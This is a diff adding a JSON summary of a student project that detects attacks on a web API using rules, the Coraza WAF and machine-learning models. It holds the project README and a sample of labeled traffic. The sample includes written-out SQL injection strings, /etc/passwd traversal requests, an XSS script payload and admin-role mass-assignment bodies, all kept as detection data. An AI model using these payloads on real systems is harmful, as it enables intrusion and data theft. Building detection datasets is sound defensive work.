@@ -1,0 +1,4414 @@
+{
+ "id": "api-attack-detection",
+ "repo": "aymane-elouafi/Web-API-Attack-Detection-With-AI",
+ "url": "https://github.com/aymane-elouafi/Web-API-Attack-Detection-With-AI",
+ "branch": "main",
+ "created_at": "2026-11-11T21:46:13Z",
+ "pushed_at": "2026-11-11T21:59:37Z",
+ "stars": 0,
+ "languages": {
+  "Python": 81918,
+  "HTML": 10546,
+  "Go": 5111,
+  "Dockerfile": 397
+ },
+ "commit_count": 2,
+ "files": 41,
+ "bytes": 1159645,
+ "top": [
+  {
+   "path": ".gitignore",
+   "dir": false
+  },
+  {
+   "path": "README.md",
+   "dir": false
+  },
+  {
+   "path": "common",
+   "dir": true
+  },
+  {
+   "path": "dashboard",
+   "dir": true
+  },
+  {
+   "path": "data",
+   "dir": true
+  },
+  {
+   "path": "detection",
+   "dir": true
+  },
+  {
+   "path": "requirements.txt",
+   "dir": false
+  },
+  {
+   "path": "target_api",
+   "dir": true
+  },
+  {
+   "path": "tests",
+   "dir": true
+  },
+  {
+   "path": "traffic",
+   "dir": true
+  },
+  {
+   "path": "waf",
+   "dir": true
+  }
+ ],
+ "commits": [
+  {
+   "sha": "3c41880",
+   "msg": "Add contributors to README",
+   "date": "2026-11-11T21:59:35Z",
+   "url": "https://github.com/aymane-elouafi/Web-API-Attack-Detection-With-AI/commit/3c418808e4dbeab109e8879e716339d3b69256dd"
+  },
+  {
+   "sha": "d12f2d8",
+   "msg": "Web API attack detection: rules, Coraza, two AI models, fusion, dashboard",
+   "date": "2026-11-11T21:52:36Z",
+   "url": "https://github.com/aymane-elouafi/Web-API-Attack-Detection-With-AI/commit/d12f2d80d3724eb6c6ed39d48396e8a087319a79"
+  }
+ ],
+ "readme": "# Web API Attack Detection\n\nAI-assisted detection of attacks against a web API: classic rules + machine learning,\ncombined into one risk score. (AI module project.)\n\n## Roadmap\n\n1. **Foundation** (done): vulnerable demo API + labeled traffic generator\n2. **Rules-based detector** (done): our own WAF-style rules, plus **Coraza + OWASP CRS** as the industry baseline (done)\n3. AI: supervised payload classifier (done); unsupervised behavior model (done, see below)\n4. Score fusion + evaluation (rules vs AI vs hybrid)\n5. Management interface (dashboard) -- first version done, see below\n\n## Layout\n\n```\ncommon/seed.py        shared seed data (users, products, orders)\ntarget_api/app.py     intentionally vulnerable FastAPI app (local only, fake data)\ntraffic/payloads.py   attack payload catalogue (with evasion variants)\ntraffic/generate.py   simulates users + attackers, writes data/dataset.csv\ndetection/rules.py    rules detector: signature rules + rate/login-failure rules, CRS-style scoring\ndetection/metrics.py  precision / recall / false-positive rate, shared by all detectors\ndetection/run_rules.py  runs the rules on the dataset and prints a report\ndetection/run_waf.py  evaluates Coraza+CRS and compares it with our rules\ndetection/report.py   report printing shared by all detectors\ndetection/ml_payload.py  supervised payload classifier (features + model + grouped cross-validation)\ndetection/run_ml.py   evaluates it and compares it with the rules and Coraza\ndashboard/            read-only management dashboard (FastAPI + one HTML page)\ndetection/ml_behavior.py  unsupervised behavior model (rolling per-client features + Isolation Forest)\ndetection/run_behavior.py  evaluates it and compares it with every other detector\ndetection/run_novel.py  held-out test on attack payloads that are not in the generator's catalogue\nwaf/                  Coraza + OWASP CRS inspection proxy (Go, built and run in Docker)\ntests/                unit tests for the rules\ndata/                 generated datasets and predictions\n```\n\n## Setup\n\n```bash\npython3 -m venv .venv\n.venv/bin/pip install -r requirements.txt\n```\n\n## Generate a dataset\n\nTerminal 1 -- start the vulnerable API (restart it between runs for a clean state):\n\n```bash\n.venv/bin/uvicorn target_api.app:app --host 127.0.0.1 --port 8000\n```\n\nTerminal 2 -- generate traffic:\n\n```bash\n.venv/bin/python -m traffic.generate --seed 42\n```\n\nOutput: `data/dataset.csv` with one row per request: what the server saw\n(method, path, query, body, user agent, status, size, time) plus the ground-truth\n`label` (0 normal / 1 attack), `attack_type` and evasion `variant`.\n\n## Run the rules detector\n\n```bash\n.venv/bin/python -m detection.run_rules          # report on data/dataset.csv\n.venv/bin/python -m unittest discover -s tests -t .   # unit tests\n```\n\nEach request gets an anomaly score (every matching rule adds points); a score of\n5 or more is flagged. Baseline result on the default dataset (seed 42):\nprecision 100%, recall 64.7%, false-positive rate 0%. It catches injection, XSS, most\npath traversal and most brute force, but misses every BOLA and mass-assignment request --\nthe cases that need context or behavior, which is what the AI phases target.\n\nCaveat: the rules were written by the same author as the payload generator, so\ntheir recall on injection attacks is optimistic. Phase 4 will test on held-out,\nnovel payloads.\n\n## Coraza + OWASP CRS baseline\n\n[Coraza](https://coraza.io) is an open-source, ModSecurity-compatible WAF written in Go. `waf/`\nis a small reverse proxy that runs every request through Coraza with the real OWASP Core Rule\nSet (CRS v4, paranoia level 1, anomaly threshold 5). It runs in **monitor mode**: every request\nis still forwarded to the API, and the verdict comes back as response headers\n(`X-WAF-Score`, `X-WAF-Rules`, `X-WAF-Block`), which the generator saves as `waf_*` columns.\nGo is not needed on the host -- it is compiled inside Docker.\n\n```bash\ndocker build -t web-api-coraza:local waf/\n```\n\nStart the API (terminal 1), then the proxy (terminal 2):\n\n```bash\n.venv/bin/uvicorn target_api.app:app --host 127.0.0.1 --port 8000\n```\n\n```bash\ndocker run -d --rm --name coraza-proxy --network host --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m --cap-drop ALL --security-opt no-new-privileges -e LISTEN=127.0.0.1:8080 -e UPSTREAM=http://127.0.0.1:8000 web-api-coraza:local\n```\n\nGenerate traffic THROUGH the proxy and evaluate (stop it afterwards with `docker stop coraza-proxy`):\n\n```bash\n.venv/bin/python -m traffic.generate --seed 42 --url http://127.0.0.1:8080\n.venv/bin/python -m detection.run_rules\n.venv/bin/python -m detection.run_waf\n```\n\nTuning that was needed (normal when putting CRS in front of a REST API): `PUT/PATCH/DELETE`\nare allowed (CRS only allows GET/HEAD/POST/OPTIONS by default), and the generator sends a\nreal `Host` name (CRS flags bare-IP Host headers). Only request rules are evaluated;\nCRS response rules (e.g. SQL-error leakage) are not.\n\nResults on the default dataset (seed 42, 3,732 requests, 1,092 attacks):\n\n| | precision | recall | false alarms |\n|---|---|---|---|\n| own rules | 100% | 64.7% | 0 |\n| Coraza + CRS | 100% | 39.1% | 0 |\n| either one flags | 100% | 65.9% | 0 |\n\nCoraza detects 100% of SQL injection, XSS and path traversal (including double-encoded\npayloads, where our rules miss some) but nothing behavioral: BOLA, mass assignment and\nbrute force are invisible to CRS (our rate / failed-login rules catch 92% of brute force).\nBoth detectors miss every BOLA and mass-assignment request -- the target for the AI phase.\n\nUser agents: only ~12% of injection / traversal / brute-force sessions use a noisy tool's\ndefault agent (sqlmap, Nikto, Hydra), and every request in those sessions is labeled an\nattack; other attackers use ordinary-looking agents. (With seed 42 only 9 requests, 1% of the\nattacks, ended up with a tool agent.) The report also shows each detector without its\nuser-agent rule (it changes almost nothing). An earlier generator where most\nattackers used sqlmap/Nikto agents let that one rule inflate Coraza's brute-force score and\ncreated fake \"false alarms\", so it was changed. The user agent must not be an ML feature.\n\n## Payload classifier (AI model #1)\n\nLearns from labeled requests instead of hand-written rules: character n-grams of the request\n(method, path shape with ids masked, parameter names, decoded values) plus a few numeric\nfeatures (length, entropy, odd-character share) into a logistic regression. It never sees the\nclient IP, user agent, attack type or variant, and it is trained only on payload attacks\n(SQLi, XSS, traversal, mass assignment) -- BOLA and brute force are behavior, not text.\n\n```bash\n.venv/bin/python -m detection.run_ml      # 5-fold cross-validation grouped by client IP + comparison\n.venv/bin/python -m detection.run_novel   # held-out test on novel payloads\n```\n\nSame dataset: 100% recall on SQLi, XSS, traversal and mass assignment, 0 false alarms, but that\nnumber is **memorisation**: the generator re-uses ~30 attack strings for training and testing.\nThe honest number is the held-out test (30 novel attacks, 15 harmless look-alikes; small, so\nindicative only): payload ML catches 28/30 (93%) with 0 false alarms; own rules catch 22/30 (73%)\nwith 0. A first version learned `--` as \"attack\" and flagged \"a -- b\" and \"great -- would buy\nagain\"; adding ~45 varied harmless sentences (`BENIGN_TEXT` in `traffic/payloads.py`, different\nfrom the test sentences, but written by the same author) to the training data fixed it.\n\n## Behavior model (AI model #2)\n\nUnsupervised, no labels: for each request it summarises what that client did in the last 60 s\n(distinct order ids, share of order requests, errors, error ratio, 404s, failed logins) and an\nIsolation Forest scores how unusual that is. It targets what text-based detectors cannot see.\n\n```bash\n.venv/bin/python -m detection.run_behavior   # report + comparison with every other detector\n```\n\nRanking quality (AUC, normal vs attack): BOLA 0.99, brute force 0.995. Flagging the 5% most\nunusual requests (a policy choice, not tuned on labels): BOLA 50%, brute force 13%, 1 false\nalarm. A \"shared object\" feature (another user already requested this order) raised BOLA from\n45%. The alert budget is the only knob; trade-off (BOLA / brute force / false alarms): 5%\n50/13/0.0%, 10% 77/42/0.5%, 15% 92/80/1.2%, 20% 97/100/4.7%. Everything together (\"any of\nthem\" at 5%): 84.5% recall, 1 false alarm. The first requests of a burst are missed (the\nwindow is still empty).\n\nImprovement history: the first version used 7 generic features (BOLA AUC 0.94, brute force\n0.98). Keeping only features that describe the attacks gave 0.99 / 0.995; adding more generic\nones (request count, speed, session age, distinct paths) made it worse. I compared about ten\nfeature sets using the labels, so these AUCs are slightly optimistic. Caveats: only 8 BOLA and\n6 brute-force clients in the data, and the model is fit on the same traffic it scores (normal\nfor anomaly detection; a live system would train on earlier traffic).\n\n## Fusion and final evaluation (Phase 4)\n\n`detection/fusion.py` turns each detector into an \"alert strength\" (0.5 = this detector alone\nwould alert: rules / Coraza score 5 of 10, payload ML p = 0.5, behavior = its alert-budget cutoff)\nand combines them with a noisy-OR, `1 - prod(1 - s)`; risk >= 0.5 is flagged. One confident\ndetector is enough, several half-convinced ones add up. The mappings are a stated policy, not\ntuned on labels.\n\n```bash\n.venv/bin/python -m detection.run_fusion                                   # needs the four predictions_*.csv\n.venv/bin/python -m detection.run_fusion --waf-url http://127.0.0.1:8080   # + Coraza on the novel payloads\n```\n\nDefault dataset (3,732 requests, 1,092 attacks):\n\n| | precision | recall | false alarms |\n|---|---|---|---|\n| rules only | 100% | 64.7% | 0 |\n| Coraza only | 100% | 39.1% | 0 |\n| AI only (payload + behavior) | 99.9% | 62.1% | 1 (0.0%) |\n| **hybrid (all four, fused)** | 99.9% | **84.5%** | 1 (0.0%) |\n\nEach detector covers a different gap: Coraza/rules/payload ML the injections, rules the\nbrute force, payload ML mass assignment, behavior ML the only BOLA hits (50%). The hybrid still\nmisses 145 BOLA and 24 brute-force requests (the start of each burst). On this data fusion\nequals the plain union of the four flags; the noisy-OR only matters when detectors are\nhalf-convinced, which the dataset rarely produces.\n\nNovel-payload test (30 unseen attacks, 15 harmless look-alikes; single requests, so no behavior\nmodel; small, indicative only): own rules 22/30, 0 false alarms; payload ML 28/30, 0; Coraza+CRS\n30/30, 1 (Coraza measured earlier, not re-run since the payload fix). Coraza is strongest on unseen injections, the hybrid's value is coverage of\nbehavior attacks, not payloads.\n\n## Dashboard (Phase 5)\n\nRead-only, local, vanilla JS (no external libraries), light and dark, works at phone width,\nrespects reduced motion / transparency / contrast. It reads `data/` only and never talks to the\ndemo API.\n\n```bash\n.venv/bin/uvicorn dashboard.app:app --host 127.0.0.1 --port 8100   # then open http://127.0.0.1:8100\n```\n\n- **Overview:** every detector side by side, recall by attack type. The threshold slider in the\n  top bar re-decides the hybrid live (lower = more alerts, more false alarms).\n- **Alerts:** flagged / missed attacks / false alarms, with the reason (which detectors fired,\n  rule and Coraza ids).\n- **Clients:** ranked by riskiest request; click one for its request timeline (risk, which\n  detectors flagged each request, why).\n- **Live feed:** Play/Pause replays the dataset in time order (1x / 4x / 20x), colouring rows by risk.\n\nNot built: real live traffic, user accounts, editing rules.\n\n## Attacks covered\n\nSQL injection, XSS (stored), path traversal, mass assignment, BOLA/IDOR,\nbrute force / credential stuffing.\n\n## Safety\n\nThe demo API is vulnerable on purpose. It only uses an in-memory database and a\nfake file system, and must only be bound to 127.0.0.1. Never deploy it.\n\n## Contributors\n\n- [Aymane Elouafi](https://github.com/aymane-elouafi) -- project owner\n- Claude (Anthropic) -- AI pair programmer; co-author of the commits\n",
+ "milestones": [
+  {
+   "label": "Foundation",
+   "detail": "vulnerable demo API + labeled traffic generator",
+   "statusText": "done",
+   "status": "done"
+  },
+  {
+   "label": "Rules-based detector",
+   "detail": "our own WAF-style rules, plus Coraza + OWASP CRS as the industry baseline (done)",
+   "statusText": "done",
+   "status": "done"
+  },
+  {
+   "label": "AI",
+   "detail": "supervised payload classifier (done); unsupervised behavior model (done, see below)",
+   "statusText": "done",
+   "status": "done"
+  },
+  {
+   "label": "Score fusion + evaluation (rules vs AI vs hybrid)",
+   "detail": "",
+   "statusText": "",
+   "status": "todo"
+  },
+  {
+   "label": "Management interface (dashboard)",
+   "detail": "first version done, see below",
+   "statusText": "",
+   "status": "wip"
+  }
+ ],
+ "sample": {
+  "total": 3732,
+  "attacks": 1092,
+  "types": [
+   "path_traversal",
+   "sqli",
+   "mass_assignment",
+   "brute_force",
+   "xss",
+   "bola"
+  ],
+  "rows": [
+   {
+    "t": 317.199,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/comments",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 387.844,
+    "ip": "45.191.35.245",
+    "m": "GET",
+    "p": "/files?name=/etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.91,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 1344.857,
+    "ip": "10.0.0.8",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user6\", \"password\": \"Passw0rd6!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 1361.812,
+    "ip": "10.0.0.31",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user29@example.com\", \"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.97,
+     0.03
+    ],
+    "r": 0.97
+   },
+   {
+    "t": 1364.488,
+    "ip": "10.0.0.31",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user29@example.com\", \"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.97,
+     0.03
+    ],
+    "r": 0.97
+   },
+   {
+    "t": 1398.211,
+    "ip": "10.0.0.32",
+    "m": "GET",
+    "p": "/products/8",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 1429.084,
+    "ip": "10.0.0.32",
+    "m": "GET",
+    "p": "/products/search?q=laptop",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 1587.753,
+    "ip": "10.0.0.8",
+    "m": "GET",
+    "p": "/orders/20",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.06
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 1597.816,
+    "ip": "10.0.0.15",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 1639.779,
+    "ip": "10.0.0.15",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"role\": \"admin\", \"name\": \"x\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 1774.239,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/products/search?q=camera",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 1889.765,
+    "ip": "10.0.0.20",
+    "m": "GET",
+    "p": "/products/44",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 2195.529,
+    "ip": "10.0.0.22",
+    "m": "GET",
+    "p": "/products/search?q=men%27s%20laptop",
+    "b": "",
+    "st": 500,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.09
+    ],
+    "r": 0.1
+   },
+   {
+    "t": 3058.999,
+    "ip": "10.0.0.32",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.13
+    ],
+    "r": 0.13
+   },
+   {
+    "t": 4762.136,
+    "ip": "10.0.0.18",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.05
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 4826.702,
+    "ip": "10.0.0.18",
+    "m": "GET",
+    "p": "/products/15",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.08
+    ],
+    "r": 0.08
+   },
+   {
+    "t": 4847.697,
+    "ip": "10.0.0.31",
+    "m": "GET",
+    "p": "/products/search?q=backpack",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.23
+    ],
+    "r": 0.24
+   },
+   {
+    "t": 4854.415,
+    "ip": "10.0.0.31",
+    "m": "GET",
+    "p": "/products/51",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.21
+    ],
+    "r": 0.21
+   },
+   {
+    "t": 5036.586,
+    "ip": "10.0.0.31",
+    "m": "GET",
+    "p": "/files?name=logo.txt",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.05
+   },
+   {
+    "t": 5079.346,
+    "ip": "10.0.0.31",
+    "m": "GET",
+    "p": "/products/search?q=dock%20silver",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 5090.032,
+    "ip": "10.0.0.31",
+    "m": "GET",
+    "p": "/users/me",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 5143.157,
+    "ip": "10.0.0.3",
+    "m": "GET",
+    "p": "/products/search?q=backpack",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 5157.822,
+    "ip": "45.154.221.17",
+    "m": "GET",
+    "p": "/products/search?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%20FROM%20users%20",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     1,
+     1,
+     0.99,
+     0.13
+    ],
+    "r": 1
+   },
+   {
+    "t": 5204.207,
+    "ip": "10.0.0.3",
+    "m": "GET",
+    "p": "/products/search?q=camera",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 5304.477,
+    "ip": "10.0.0.3",
+    "m": "GET",
+    "p": "/orders/5",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.23
+    ],
+    "r": 0.23
+   },
+   {
+    "t": 5472.77,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/orders/48",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.13
+    ],
+    "r": 0.13
+   },
+   {
+    "t": 5489.102,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.13
+    ],
+    "r": 0.13
+   },
+   {
+    "t": 5492.205,
+    "ip": "10.0.0.17",
+    "m": "GET",
+    "p": "/products/search?q=laptop",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.13
+    ],
+    "r": 0.13
+   },
+   {
+    "t": 7123.901,
+    "ip": "10.0.0.3",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"email\": \"user1@example.com\", \"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.97,
+     0.03
+    ],
+    "r": 0.97
+   },
+   {
+    "t": 8484.678,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/products/search?q=webcam%20black",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 8605.08,
+    "ip": "10.0.0.16",
+    "m": "GET",
+    "p": "/products/search?q=drone%20black",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.06
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 8804.874,
+    "ip": "91.223.216.18",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user12\", \"password\": \"abc123\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.27
+    ],
+    "r": 0.27
+   },
+   {
+    "t": 8807.437,
+    "ip": "91.223.216.18",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user12\", \"password\": \"admin\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0.5,
+     0,
+     0.16,
+     0.32
+    ],
+    "r": 0.72
+   },
+   {
+    "t": 8809.066,
+    "ip": "91.223.216.18",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user12\", \"password\": \"abc123\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     0.5,
+     0,
+     0.01,
+     0.35
+    ],
+    "r": 0.68
+   },
+   {
+    "t": 8815.205,
+    "ip": "91.223.216.18",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user12\", \"password\": \"master\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.4
+    ],
+    "r": 1
+   },
+   {
+    "t": 8821.611,
+    "ip": "91.223.216.18",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user12\", \"password\": \"princess\"}",
+    "st": 401,
+    "a": "brute_force",
+    "s": [
+     1,
+     0,
+     0.01,
+     0.49
+    ],
+    "r": 1
+   },
+   {
+    "t": 8931.359,
+    "ip": "185.85.51.128",
+    "m": "GET",
+    "p": "/files?name=..%5c..%5cetc%5cpasswd",
+    "b": "",
+    "st": 404,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.99,
+     0.32
+    ],
+    "r": 1
+   },
+   {
+    "t": 8959.366,
+    "ip": "185.85.51.128",
+    "m": "GET",
+    "p": "/files?name=../../../../etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.27
+    ],
+    "r": 1
+   },
+   {
+    "t": 9907.821,
+    "ip": "10.0.0.28",
+    "m": "GET",
+    "p": "/products/8",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.14
+    ],
+    "r": 0.14
+   },
+   {
+    "t": 9993.85,
+    "ip": "194.183.162.107",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"100% recommended\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 10026.89,
+    "ip": "194.183.162.107",
+    "m": "POST",
+    "p": "/comments",
+    "b": "{\"text\": \"<svg><script>alert&#40;1&#41;</script>\"}",
+    "st": 200,
+    "a": "xss",
+    "s": [
+     0.8,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 11129.599,
+    "ip": "10.0.0.25",
+    "m": "GET",
+    "p": "/orders",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.07
+    ],
+    "r": 0.07
+   },
+   {
+    "t": 11392.605,
+    "ip": "10.0.0.13",
+    "m": "GET",
+    "p": "/products/44",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 11493.032,
+    "ip": "10.0.0.12",
+    "m": "GET",
+    "p": "/products/search?q=usb-c%20laptop",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.06
+    ],
+    "r": 0.06
+   },
+   {
+    "t": 12202.575,
+    "ip": "10.0.0.28",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"user26\", \"password\": \"Passw0rd26!\"}",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 12260.234,
+    "ip": "10.0.0.28",
+    "m": "GET",
+    "p": "/products/search?q=ssd",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0,
+     0.03
+    ],
+    "r": 0.03
+   },
+   {
+    "t": 12507.604,
+    "ip": "10.0.0.13",
+    "m": "PUT",
+    "p": "/users/me",
+    "b": "{\"role\": \"admin\"}",
+    "st": 200,
+    "a": "mass_assignment",
+    "s": [
+     0,
+     0,
+     0.99,
+     0.03
+    ],
+    "r": 0.99
+   },
+   {
+    "t": 12571.032,
+    "ip": "194.254.144.34",
+    "m": "POST",
+    "p": "/login",
+    "b": "{\"username\": \"' UNION SELECT 1, 2, 3 --\", \"password\": \"x\"}",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.13
+    ],
+    "r": 1
+   },
+   {
+    "t": 12911.448,
+    "ip": "185.132.216.175",
+    "m": "GET",
+    "p": "/files?name=terms.txt",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.03
+    ],
+    "r": 0.04
+   },
+   {
+    "t": 12912.803,
+    "ip": "185.132.216.175",
+    "m": "GET",
+    "p": "/files?name=../../etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     1,
+     1,
+     1,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 12914.771,
+    "ip": "185.132.216.175",
+    "m": "GET",
+    "p": "/files?name=/etc/passwd",
+    "b": "",
+    "st": 200,
+    "a": "path_traversal",
+    "s": [
+     0.5,
+     1,
+     0.91,
+     0.19
+    ],
+    "r": 1
+   },
+   {
+    "t": 15805.007,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/orders/69",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.34
+    ],
+    "r": 0.35
+   },
+   {
+    "t": 15851.513,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/orders/80",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.45
+    ],
+    "r": 0.45
+   },
+   {
+    "t": 15893.497,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/orders/89",
+    "b": "",
+    "st": 200,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.45
+    ],
+    "r": 0.45
+   },
+   {
+    "t": 15958.79,
+    "ip": "10.0.0.28",
+    "m": "GET",
+    "p": "/products/search?q=men%27s%20keyboard",
+    "b": "",
+    "st": 500,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.18
+    ],
+    "r": 0.19
+   },
+   {
+    "t": 15959.508,
+    "ip": "10.0.0.21",
+    "m": "GET",
+    "p": "/orders/102",
+    "b": "",
+    "st": 404,
+    "a": "bola",
+    "s": [
+     0,
+     0,
+     0,
+     0.55
+    ],
+    "r": 0.55
+   },
+   {
+    "t": 16209.095,
+    "ip": "10.0.0.14",
+    "m": "GET",
+    "p": "/products/search?q=watch%2050%25%20off",
+    "b": "",
+    "st": 200,
+    "a": "",
+    "s": [
+     0,
+     0,
+     0.01,
+     0.07
+    ],
+    "r": 0.08
+   },
+   {
+    "t": 16681.464,
+    "ip": "103.40.184.102",
+    "m": "GET",
+    "p": "/products/search?q=%27%20UnIon%20SELeCT%20NaMe%2C%20SQL%2C%201%20FroM%20SqlitE_mASTER%20--",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     1,
+     1,
+     0.99,
+     0.03
+    ],
+    "r": 1
+   },
+   {
+    "t": 16692.017,
+    "ip": "103.40.184.102",
+    "m": "GET",
+    "p": "/products/search?q=%27%3B%20DrOp%20TabLE%20users%3B%20--",
+    "b": "",
+    "st": 500,
+    "a": "sqli",
+    "s": [
+     0.8,
+     1,
+     0.99,
+     0.1
+    ],
+    "r": 1
+   },
+   {
+    "t": 16741.88,
+    "ip": "103.40.184.102",
+    "m": "GET",
+    "p": "/products/search?q=%27%20OR%201%3D1%20--",
+    "b": "",
+    "st": 200,
+    "a": "sqli",
+    "s": [
+     0.8,
+     0.5,
+     1,
+     0.23
+    ],
+    "r": 1
+   },
+   {
+    "t": 16749.837,
+    "ip": "103.40.184.102",
